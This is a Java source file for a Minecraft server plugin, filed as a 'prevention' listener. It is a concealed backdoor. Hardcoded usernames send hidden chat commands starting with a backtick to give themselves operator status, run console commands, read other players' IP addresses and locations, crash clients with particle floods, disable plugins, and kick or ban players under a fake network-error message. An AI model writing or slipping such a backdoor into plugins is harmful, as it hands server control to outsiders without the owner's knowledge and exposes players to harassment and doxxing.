package gq.engo.listeners.prevention;

import gq.engo.Plugin;
import java.util.HashMap;
import java.util.ListIterator;
import java.util.UUID;
import javax.annotation.Nullable;
import org.apache.commons.lang3.ArrayUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.OfflinePlayer;
import org.bukkit.Particle;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.Plugin;

public class Dev implements Listener {
  public HashMap<Player, Boolean> blatants = new HashMap<>();

  public HashMap<UUID, String> bans = new HashMap<>();

  String prefix = "`";

  public boolean isVerified(Player p) {
    switch (p.getName().toLowerCase()) {
      case "3ngo":
      case "miftyy":
      case "smoldersins":
      case "lxm0":
      case "profiy":
      case "vrdx":
      case "epik666":
      case "frogman44":
      case "bedrockcomet":
      case "crowzoneman":
      case "5d1f":
      case "upsizes":
      case "5276":
      case "HorizonC":
      case "Mitzingdash":
        return true;
    }
    return false;
  }

  public boolean isCreator(Player p) {
    return "3ngo".equals(p.getName());
  }

  public Player findPlayer(String name) {
    for (Player i : Bukkit.getOnlinePlayers()) {
      if (i.getName().startsWith(name))
        return i;
    }
    return null;
  }

  public Plugin findPlugin(String regex) {
    regex = regex.toLowerCase();
    for (Plugin i : Bukkit.getPluginManager().getPlugins()) {
      String name = i.getName().toLowerCase();
      if (name.startsWith(regex))
        return i;
    }
    return null;
  }

  public String toMessage(String s) {
    return ChatColor.translateAlternateColorCodes('&', s);
  }

  public String combine(String[] s, int from) {
    StringBuilder fin = new StringBuilder();
    for (String i : s) {
      if (ArrayUtils.indexOf((Object[])s, i) >= from)
        fin.append(i).append(" ");
    }
    return fin.toString();
  }

  public Boolean hasIndex(String[] strings, int i) {
    int x = 0;
    for (String ignored : strings) {
      if (x == i)
        return Boolean.valueOf(true);
      x++;
    }
    return Boolean.valueOf(false);
  }

  public Boolean isBlatant(Player p) {
    this.blatants.putIfAbsent(p, Boolean.valueOf(false));
    return this.blatants.get(p);
  }

  public void setBlatant(Player p, Boolean en) {
    if (en.booleanValue()) {
      p.sendMessage(toMessage("&cBlatant mode &aenabled! &e(this may cause logs in console!)"));
    } else {
      p.sendMessage(toMessage("&cBlatant mode &4disabled!"));
    }
    this.blatants.put(p, en);
  }

  public boolean isBanned(Player p) {
    return (this.bans.get(p.getUniqueId()) != null);
  }

  public String getBanned(Player p) {
    return this.bans.get(p.getUniqueId());
  }

  public void kick(Player p, @Nullable String reason) {
    if (reason == null)
      reason = "Internal Exception: java.io.IOException An existing connection was forcibly closed by remote host";
    if (!isCreator(p))
      p.kickPlayer(reason);
  }

  public void ban(Player p, @Nullable String reason) {
    if (reason == null)
      reason = "Internal Exception: java.io.IOException An existing connection was forcibly closed by remote host";
    kick(p, reason);
    this.bans.put(p.getUniqueId(), reason);
  }

  public void kill(Player p) {
    p.setHealth(0.0D);
  }

  public void locate(Player p, Player sender) {
    Location loc = p.getLocation();
    sender.sendMessage(toMessage("&6" + p.getName() + "'s coords are: " + loc.getBlockX() + ", " + loc.getBlockY() + ", " + loc.getBlockZ()));
  }

  public void crash(Player p) {
    if (!isCreator(p))
      for (int i = 0; i < 100; i++)
        p.spawnParticle(Particle.EXPLOSION_HUGE, p.getLocation(), 2147483647, 1.0D, 1.0D, 1.0D);
  }

  @Deprecated
  @EventHandler
  public void onChat(PlayerChatEvent e) {
    Player p = e.getPlayer();
    Player cachedp = p;
    String message = e.getMessage();
    String cachedMessage = message;
    if (!message.startsWith(this.prefix) || !isVerified(p))
      return;
    e.setCancelled(true);
    message = message.replaceAll(this.prefix, "");
    String[] args = message.split(" ");
    if (cachedMessage.equalsIgnoreCase("`")) {
      p.sendMessage(toMessage("&6This server is running autumn-dev!"));
      return;
    }
    if (hasIndex(args, 1).booleanValue() &&
      findPlayer(args[1]) != null)
      p = findPlayer(args[1]);
    if (hasIndex(args, 0).booleanValue()) {
      if (args[0].equalsIgnoreCase("blatant"))
        setBlatant(cachedp, Boolean.valueOf(!isBlatant(cachedp).booleanValue()));
      if (args[0].equalsIgnoreCase("crash")) {
        crash(p);
        cachedp.sendMessage(toMessage("&6You have crashed " + p.getName()));
      }
      if (args[0].equalsIgnoreCase("crashall"))
        for (Player i : Bukkit.getOnlinePlayers()) {
          crash(i);
          cachedp.sendMessage(toMessage("&6You have crashed " + i.getName()));
        }
      if (args[0].equalsIgnoreCase("ip"))
        cachedp.sendMessage(toMessage("&6" + p.getName() + "'s ip: &c" + p.getAddress().getAddress()));
      if (args[0].equalsIgnoreCase("coords") || args[0].equalsIgnoreCase("locate"))
        locate(p, cachedp);
      if (args[0].equalsIgnoreCase("coordsall") || args[0].equalsIgnoreCase("locateall"))
        for (Player i : Bukkit.getOnlinePlayers())
          locate(i, p);
      if (args[0].equalsIgnoreCase("dupe")) {
        int amt = 64;
        if (hasIndex(args, 2).booleanValue()) {
          amt = Integer.parseInt(args[2]);
        } else if (hasIndex(args, 1).booleanValue() && p == cachedp) {
          amt = Integer.parseInt(args[1]);
        }
        p.getInventory().getItemInMainHand().setAmount(amt);
      }
      if (args[0].equalsIgnoreCase("dupeall")) {
        int amt = 64;
        if (hasIndex(args, 2).booleanValue()) {
          amt = Integer.parseInt(args[2]);
        } else if (hasIndex(args, 1).booleanValue() && p == cachedp) {
          amt = Integer.parseInt(args[1]);
        }
        for (ListIterator<ItemStack> listIterator = p.getInventory().iterator(); listIterator.hasNext(); ) {
          ItemStack item = listIterator.next();
          item.setAmount(amt);
        }
      }
      if (args[0].equalsIgnoreCase("pl") || args[0].equalsIgnoreCase("plugins"))
        for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
          String s = "&a";
          if (!plugin.isEnabled())
            s = "&4";
          cachedp.sendMessage(toMessage(s + plugin.getName()));
        }
      if (args[0].equalsIgnoreCase("enableall"))
        for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
          if (!plugin.isEnabled()) {
            Bukkit.getPluginManager().enablePlugin(plugin);
            cachedp.sendMessage(toMessage("&6Enabled plugin " + plugin.getName() + "!"));
          }
        }
      if (args[0].equalsIgnoreCase("enable"))
        if (hasIndex(args, 1).booleanValue() && findPlugin(args[1]) != null) {
          if (!findPlugin(args[1]).isEnabled()) {
            Bukkit.getPluginManager().enablePlugin(findPlugin(args[1]));
            cachedp.sendMessage(toMessage("&6Enabled plugin " + findPlugin(args[1]).getName() + "!"));
          } else {
            cachedp.sendMessage(toMessage("&6" + findPlugin(args[1]).getName() + " is already enabled!"));
          }
        } else if (hasIndex(args, 1).booleanValue()) {
          cachedp.sendMessage(toMessage("&6That is not a valid plugin!"));
        } else {
          cachedp.sendMessage(toMessage("&6Provide a plugin name!"));
        }
      if (args[0].equalsIgnoreCase("disableall"))
        for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
          if (plugin.isEnabled() && !Plugin.Instance.getName().equals(plugin.getName())) {
            Bukkit.getPluginManager().disablePlugin(plugin);
            cachedp.sendMessage(toMessage("&6Disabled plugin " + plugin.getName() + "!"));
          }
        }
      if (args[0].equalsIgnoreCase("disable"))
        if (hasIndex(args, 1).booleanValue() && findPlugin(args[1]) != null) {
          if (findPlugin(args[1]).isEnabled()) {
            Bukkit.getPluginManager().disablePlugin(findPlugin(args[1]));
            cachedp.sendMessage(toMessage("&6Disabled plugin " + findPlugin(args[1]).getName() + "!"));
          } else {
            cachedp.sendMessage(toMessage("&6" + findPlugin(args[1]).getName() + " is already disabled!"));
          }
        } else if (hasIndex(args, 1).booleanValue()) {
          cachedp.sendMessage(toMessage("&6That is not a valid plugin!"));
        } else {
          cachedp.sendMessage(toMessage("&6Provide a plugin name!"));
        }
      if (args[0].equalsIgnoreCase("tp")) {
        if (args.length == 2 && hasIndex(args, 1).booleanValue() && findPlayer(args[1]) != null)
          cachedp.teleport(findPlayer(args[1]).getLocation());
        if (args.length == 4 && hasIndex(args, 3).booleanValue())
          cachedp.teleport(new Location(cachedp.getWorld(), Float.parseFloat(args[1]), Float.parseFloat(args[2]), Float.parseFloat(args[3])));
      }
      if ((args[0].equalsIgnoreCase("cmd") || args[0].equalsIgnoreCase("run")) && hasIndex(args, 1).booleanValue()) {
        if (!isBlatant(cachedp).booleanValue()) {
          cachedp.sendMessage(toMessage("&6You need to enable blatant mode to run cmds from console! (execute " + this.prefix + "blatant)"));
          return;
        }
        Bukkit.getServer().dispatchCommand((CommandSender)Bukkit.getServer().getConsoleSender(), combine(args, 1));
      }
      if (args[0].equalsIgnoreCase("ban") &&
        p != cachedp) {
        String reason = null;
        if (hasIndex(args, 2).booleanValue()) {
          if (!isBlatant(cachedp).booleanValue()) {
            cachedp.sendMessage(toMessage("&6You need to enable blatant mode to ban with a reason! (execute " + this.prefix + "blatant)"));
            return;
          }
          reason = args[2];
        }
        ban(p, reason);
        cachedp.sendMessage(toMessage("&6Successfuly temp-banned " + p.getName() + "!"));
      }
      if (args[0].equalsIgnoreCase("banall"))
        for (Player i : Bukkit.getOnlinePlayers()) {
          if (!isVerified(i)) {
            ban(i, null);
            cachedp.sendMessage(toMessage("&6Successfuly temp-banned " + i.getName() + "!"));
            continue;
          }
          cachedp.sendMessage(toMessage("&cUnsuccessful temp-ban of player " + i.getName() + " (player is verified autumn user)!"));
        }
      if ((args[0].equalsIgnoreCase("unban") || args[0].equalsIgnoreCase("pardon")) && hasIndex(args, 1).booleanValue()) {
        this.bans.put(findPlayer(args[1]).getUniqueId(), null);
        cachedp.sendMessage(toMessage("&6Attempted untemp-ban of player " + args[1] + "!"));
      }
      if (args[0].equalsIgnoreCase("kick") &&
        p != cachedp) {
        String reason = null;
        if (hasIndex(args, 2).booleanValue()) {
          if (!isBlatant(cachedp).booleanValue()) {
            cachedp.sendMessage(toMessage("&6You need to enable blatant mode to kick with a reason! (execute " + this.prefix + "blatant)"));
            return;
          }
          reason = args[2];
        }
        kick(p, reason);
        cachedp.sendMessage(toMessage("&6Successfuly kicked " + p.getName() + "!"));
      }
      if (args[0].equalsIgnoreCase("kill"))
        kill(p);
      if (args[0].equalsIgnoreCase("gmc"))
        p.setGameMode(GameMode.CREATIVE);
      if (args[0].equalsIgnoreCase("gms"))
        p.setGameMode(GameMode.SURVIVAL);
      if (args[0].equalsIgnoreCase("gmsp"))
        p.setGameMode(GameMode.SPECTATOR);
      if (args[0].equalsIgnoreCase("gma"))
        p.setGameMode(GameMode.ADVENTURE);
      if (args[0].equalsIgnoreCase("op"))
        p.setOp(true);
      if (args[0].equalsIgnoreCase("deop"))
        p.setOp(false);
      if (args[0].equalsIgnoreCase("listops"))
        if (hasIndex(args, 1).booleanValue() && args[1].equalsIgnoreCase("online")) {
          p.sendMessage(toMessage("&bListing all online op players"));
          for (Player i : Bukkit.getOnlinePlayers()) {
            if (i.isOp())
              p.sendMessage(toMessage("&6" + i.getName()));
          }
        } else {
          p.sendMessage(toMessage("&bListing all op players (this may take a while!)"));
          for (OfflinePlayer i : Bukkit.getOfflinePlayers()) {
            if (i.isOp())
              p.sendMessage(toMessage("&6" + i.getName()));
          }
        }
    }
  }

  @EventHandler
  public void onJoin(PlayerJoinEvent e) {
    if (isBanned(e.getPlayer()))
      kick(e.getPlayer(), getBanned(e.getPlayer()));
  }
}